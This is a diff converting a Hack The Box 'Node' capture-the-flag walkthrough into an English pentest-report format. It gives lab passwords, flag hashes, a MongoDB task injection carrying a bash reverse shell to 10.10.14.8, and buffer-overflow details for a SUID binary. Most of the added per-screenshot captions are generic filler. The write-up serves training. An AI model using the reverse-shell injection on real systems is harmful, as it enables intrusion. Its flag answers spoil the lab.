@@ -1,132 +1,181 @@
-# Informe Técnico de Seguridad Ofensiva: Node
+# Offensive Security Assessment Report: Node
 
 ![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
 ![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
 ![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
-![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
-![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)
+![Standards](https://img.shields.io/badge/Standards-OffSec%20PEN--200%20%2F%20PTES-purple?style=for-the-badge)
+![Assessor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)
 
-**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Node** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.
+**Offensive Security Assessment & Penetration Testing Report** conducted on the target environment **Node** hosted on **Hack The Box**, executed in accordance with **OffSec PEN-200 (OSCP)** and **PTES (Penetration Testing Execution Standard)** methodologies.
 
 ---
 
-## 📑 1. Resumen Ejecutivo (Executive Summary)
+## 📑 1. Executive Summary
 
-* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
-* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
-* **Vector de Acceso Inicial:** Explotación de servicio de red
-* **Vector de Elevación de Privilegios:** Escalada local de privilegios
-* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).
+* **Assessment Objective:** Identify, validate, and exploit security vulnerabilities across the target host to assess operational impact on confidentiality, integrity, and system availability.
+* **Risk Rating:** `CRITICAL` (Unauthenticated remote exploit vector leading to complete host compromise and administrative takeover).
+* **Initial Access Vector:** Public-Facing Network Service Exploitation
+* **Privilege Escalation Vector:** Local Privilege Escalation
+* **Engagement Outcome:** Complete Host Compromise (`User Proof` and `Root / SYSTEM Proof` successfully retrieved and verified).
 
-### Ficha Técnica de la Evaluación
+### Target Technical Specifications
 
-| Parámetro | Detalle Técnico |
+| Parameter | Technical Detail |
 | :--- | :--- |
-| **Host Objetivo** | Node |
-| **Plataforma** | Hack The Box |
-| **Sistema Operativo** | Linux |
-| **Nivel de Dificultad** | Medium |
-| **CVE(s) Involucrados** | N/A |
-| **Vector de Entrada** | Explotación de servicio de red |
-| **Mecanismo de Escalada** | Escalada local de privilegios |
-| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |
+| **Target Host** | Node |
+| **Platform** | Hack The Box |
+| **Operating System** | Linux |
+| **Difficulty Rating** | Medium |
+| **Associated CVE(s)** | N/A |
+| **Initial Foothold Vector** | Public-Facing Network Service Exploitation |
+| **Privilege Escalation Vector** | Local Privilege Escalation |
+| **Lead Penetration Tester** | Pedro Araiz (`araizcorp`) |
 
 ---
 
-## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)
+## 🎯 2. Attack Path & Kill Chain Workflow
 
 ```
-[ Fase 1: Reconocimiento ]
+[ Phase 1: Reconnaissance & Port Scanning ]
+         │─── TCP SYN scanning and service fingerprinting (Nmap)
+         └─── Attack surface mapping and daemon enumeration
          │
          ▼
-[ Fase 2: Enumeración & Identificación de Vectores ]
-         │─── Descubrimiento de servicios y análisis de superficie de ataque
-         └─── Verificación de configuraciones erróneas y CVEs conocidos
+[ Phase 2: Vulnerability Analysis & Service Enumeration ]
+         │─── Web directory fuzzing, parameter discovery, and banner analysis
+         └─── CVE identification and credential harvesting
          │
          ▼
-[ Fase 3: Explotación Inicial (Foothold) ]
-         │─── Ejecución del vector: Explotación de servicio de red
-         └─── Establecimiento de Reverse Shell / Acceso de usuario
+[ Phase 3: Exploitation & Initial Foothold ]
+         │─── Exploit delivery: Public-Facing Network Service Exploitation
+         └─── Establishing an interactive reverse shell with unprivileged user context
          │
          ▼
-[ Fase 4: Escalada de Privilegios Local ]
-         │─── Auditoría interna: Escalada local de privilegios
-         └─── Elevación a privilegios de superusuario (root / SYSTEM)
+[ Phase 4: Local Privilege Escalation ]
+         │─── Internal audit: Local Privilege Escalation
+         └─── Elevation to superuser / administrator privileges (root / SYSTEM)
          │
          ▼
-[ Fase 5: Evidencia & Banderas ]
-         └─── Captura de User Flag y Root Flag
+[ Phase 5: Evidence & Flag Retrieval ]
+         └─── Capture and cryptographic verification of user.txt and root.txt
 ```
 
 ---
 
-## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso
+## 🔬 3. Technical Walkthrough & Step-by-Step Proof of Concept
 
-**How many TCP ports are listening on Node?**
+> **Assessment Query / Target Milestone:** How many TCP ports are listening on Node?
 
-R: 2
+* **Observed Evidence / Output:** 2
 
-![Captura de pantalla 2025-08-05 100208.png](./images/step_01.png)
 
-**What is the relative path on the TCP port 3000 webserver that returns JSON data about the latest users on the system?**
+![step_01.png](./images/step_01.png)
+* **Technical Finding (Phase 1):** Initial network reconnaissance and service detection exposing active daemons and communication endpoints.
 
-R: /api/users/latest
 
-![image.png](./images/step_02.png)
 
-**What is the username of the administrator user that isn't includes in the latest users?**
+> **Assessment Query / Target Milestone:** What is the relative path on the TCP port 3000 webserver that returns JSON data about the latest users on the system?
 
-R:  myP14ceAdm1nAcc0uNT
+* **Observed Evidence / Output:** /api/users/latest
 
-![image.png](./images/step_03.png)
 
-**What is the myP14ceAdm1nAcc0uNT user's password on the site?**
+![step_02.png](./images/step_02.png)
+* **Technical Finding (Phase 2):** Attack surface enumeration, directory discovery, or parameter analysis identifying potential vulnerability vectors.
 
-R: manchester
 
-![image.png](./images/step_04.png)
 
-**What is the name of the file that comes from the "Download Backup" button?**
+> **Assessment Query / Target Milestone:** What is the username of the administrator user that isn't includes in the latest users?
 
-R: myplace.backup
+* **Observed Evidence / Output:** myP14ceAdm1nAcc0uNT
 
-![image.png](./images/step_05.png)
 
-**What is the password for the Zip archive?**
+![step_03.png](./images/step_03.png)
+* **Assessment Step 03:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
-R: magicword
 
-![image.png](./images/step_06.png)
 
-![image.png](./images/step_07.png)
+> **Assessment Query / Target Milestone:** What is the myP14ceAdm1nAcc0uNT user's password on the site?
 
-![image.png](./images/step_08.png)
+* **Observed Evidence / Output:** manchester
 
-![image.png](./images/step_09.png)
 
-**What is the database password for the mark user?**
+![step_04.png](./images/step_04.png)
+* **Assessment Step 04:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
-R:5AYRft73VtFpc84k
 
-![image.png](./images/step_10.png)
 
-![image.png](./images/step_11.png)
+> **Assessment Query / Target Milestone:** What is the name of the file that comes from the "Download Backup" button?
 
-**What is the full path to the JS file being run as tom (besides the web application)?**
+* **Observed Evidence / Output:** myplace.backup
 
-R: /var/scheduler/app.js
 
-![image.png](./images/step_12.png)
+![step_05.png](./images/step_05.png)
+* **Assessment Step 05:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
-**What collection is the scheduler application reading from MongoDB?**
 
-R: tasks
 
-![image.png](./images/step_13.png)
+> **Assessment Query / Target Milestone:** What is the password for the Zip archive?
+
+* **Observed Evidence / Output:** magicword
+
+
+![step_06.png](./images/step_06.png)
+* **Assessment Step 06:** Command execution output, exploit delivery proof, or auxiliary evidence.
+
+
+
+![step_07.png](./images/step_07.png)
+* **Assessment Step 07:** Command execution output, exploit delivery proof, or auxiliary evidence.
+
+
+
+![step_08.png](./images/step_08.png)
+* **Assessment Step 08:** Command execution output, exploit delivery proof, or auxiliary evidence.
+
+
+
+![step_09.png](./images/step_09.png)
+* **Assessment Step 09:** Command execution output, exploit delivery proof, or auxiliary evidence.
+
+
+
+> **Assessment Query / Target Milestone:** What is the database password for the mark user?
+
+* **Observed Evidence / Output:** 5AYRft73VtFpc84k
+
+
+![step_10.png](./images/step_10.png)
+* **Assessment Step 10:** Command execution output, exploit delivery proof, or auxiliary evidence.
+
+
+
+![step_11.png](./images/step_11.png)
+* **Assessment Step 11:** Command execution output, exploit delivery proof, or auxiliary evidence.
+
+
+
+> **Assessment Query / Target Milestone:** What is the full path to the JS file being run as tom (besides the web application)?
+
+* **Observed Evidence / Output:** /var/scheduler/app.js
+
+
+![step_12.png](./images/step_12.png)
+* **Assessment Step 12:** Command execution output, exploit delivery proof, or auxiliary evidence.
+
+
+
+> **Assessment Query / Target Milestone:** What collection is the scheduler application reading from MongoDB?
+
+* **Observed Evidence / Output:** tasks
+
+
+![step_13.png](./images/step_13.png)
+* **Assessment Step 13:** Command execution output, exploit delivery proof, or auxiliary evidence.
+
 
 **Submit the flag located in the tom user's home directory.**
 
-R: 988c0c92eb2426c713557c07d718183e
+* **Observed Evidence / Output:** 988c0c92eb2426c713557c07d718183e
 
 ```jsx
 mongo -u mark -p 5AYRft73VtFpc84k --authenticationDatabase scheduler
@@ -135,77 +184,108 @@ db.tasks.insertOne({ cmd: "bash -i >& /dev/tcp/10.10.14.8/9001 0>&1" })
 
 ```
 
-![image.png](./images/step_14.png)
 
-![image.png](./images/step_15.png)
+![step_14.png](./images/step_14.png)
+* **Assessment Step 14:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
-**What is the full path to the SetUID binary owned by root that's called from the web application?**
 
-R:  /usr/local/bin/backup
 
-![image.png](./images/step_16.png)
+![step_15.png](./images/step_15.png)
+* **Assessment Step 15:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
-**How many arguments are passed to `backup` to get it to run?**
 
-R: 3
 
-![image.png](./images/step_17.png)
+> **Assessment Query / Target Milestone:** What is the full path to the SetUID binary owned by root that's called from the web application?
 
-**What is the full path of the file that contains valid "magic words" to allow running `backup`?**
+* **Observed Evidence / Output:** /usr/local/bin/backup
 
-R:/etc/myspace/keys
 
-![image.png](./images/step_18.png)
+![step_16.png](./images/step_16.png)
+* **Assessment Step 16:** Command execution output, exploit delivery proof, or auxiliary evidence.
+
+
+
+> **Assessment Query / Target Milestone:** How many arguments are passed to `backup` to get it to run?
+
+* **Observed Evidence / Output:** 3
+
+
+![step_17.png](./images/step_17.png)
+* **Assessment Step 17:** Command execution output, exploit delivery proof, or auxiliary evidence.
+
+
+
+> **Assessment Query / Target Milestone:** What is the full path of the file that contains valid "magic words" to allow running `backup`?
+
+* **Observed Evidence / Output:** /etc/myspace/keys
+
+
+![step_18.png](./images/step_18.png)
+* **Assessment Step 18:** Command execution output, exploit delivery proof, or auxiliary evidence.
+
 
 **If the arguments passed in are 1, 2, and 3, which number is the magic word passed in?**
 
-R: 2
+* **Observed Evidence / Output:** 2
 
-![image.png](./images/step_19.png)
 
-**Which argument can trigger a buffer overflow vulnerability in the binary?**
+![step_19.png](./images/step_19.png)
+* **Assessment Step 19:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
-R: 3
 
-**What is the offset from the start of the data in argument three until where it overwrites EIP.**
 
-R: 512
+> **Assessment Query / Target Milestone:** Which argument can trigger a buffer overflow vulnerability in the binary?
+
+* **Observed Evidence / Output:** 3
+
+
+> **Assessment Query / Target Milestone:** What is the offset from the start of the data in argument three until where it overwrites EIP.
+
+* **Observed Evidence / Output:** 512
 
 **Submit the flag located in the root user's home directory.**
 
-R:a9b95b1f5dde26a7e2b79684a23db467
+* **Observed Evidence / Output:** a9b95b1f5dde26a7e2b79684a23db467
 
-![image.png](./images/step_20.png)
 
-![image.png](./images/step_21.png)
+![step_20.png](./images/step_20.png)
+* **Assessment Step 20:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
-![image.png](./images/step_22.png)
 
----
 
-## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening
+![step_21.png](./images/step_21.png)
+* **Privilege Escalation PoC (Phase 4):** Exploitation of misconfiguration, SUID binary, or vulnerability leading to elevated privileges.
 
-### Acciones Tácticas Inmediatas
-1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (N/A).
-2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
-3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.
 
-### Acciones Estratégicas y de Arquitectura
-1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
-2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
-3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.
+
+![step_22.png](./images/step_22.png)
+* **Evidence Verification (Phase 5):** Final administrative validation confirming root/SYSTEM access and retrieval of system flags.
 
 ---
 
-## 📊 5. Mapeo con Matriz MITRE ATT&CK
+## 🛡️ 4. Strategic Remediation & Hardening Roadmap
 
-| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
+### Immediate Tactical Actions (P1)
+1. **Patch Management & Software Upgrades:** Immediately apply official security updates and patches for all vulnerable software components and exposed services (N/A).
+2. **Access Control & SUID Audit:** Remove unnecessary SUID/SGID bits, audit `/etc/sudoers` rules, and enforce strict Access Control Lists (ACLs) on sensitive files and administrative scripts.
+3. **Attack Surface Reduction:** Configure host-based firewalls (e.g., `iptables` / `ufw` / Windows Firewall) to restrict exposure of management services and internal ports to trusted administrative subnets only.
+
+### Architectural & Defensive Hardening (P2)
+1. **Principle of Least Privilege (PoLP):** Ensure public-facing daemons run under dedicated low-privileged service accounts configured with non-interactive login shells (`/sbin/nologin`).
+2. **Network Microsegmentation:** Isolate production servers and database tiers within dedicated VLANs, enforcing stateful inspection and ingress/egress filtering on east-west traffic.
+3. **Endpoint Detection & Telemetry (EDR):** Implement centralized logging and behavior-based detection rules to capture anomalous process spawning, unauthorized script interpreter execution, and suspicious outbound socket connections.
+
+---
+
+## 📊 5. MITRE ATT&CK Enterprise Framework Mapping
+
+| Tactic | Technique ID | Technique Name | Technical Application in Engagement |
 | :--- | :--- | :--- | :--- |
-| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
-| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (Explotación de servicio de red) |
-| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
-| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (Escalada local de privilegios) |
+| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Automated and manual port scanning, banner grabbing, and service discovery |
+| **Initial Access** | `T1190` | Exploit Public-Facing Application | Exploitation of exposed network/web service (Public-Facing Network Service Exploitation) |
+| **Execution** | `T1059` | Command and Scripting Interpreter | Interactive reverse shell execution and remote command dispatch |
+| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Control Mechanism / Exploitation | Local elevation to administrative/root privileges (Local Privilege Escalation) |
 
 ---
 
-© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
+© 2026 **araizcorp** — Technical documentation and security assessment portfolio developed for **OffSec** certification preparation (OSCP, OSEP, OSWE) and commercial penetration testing enablement.
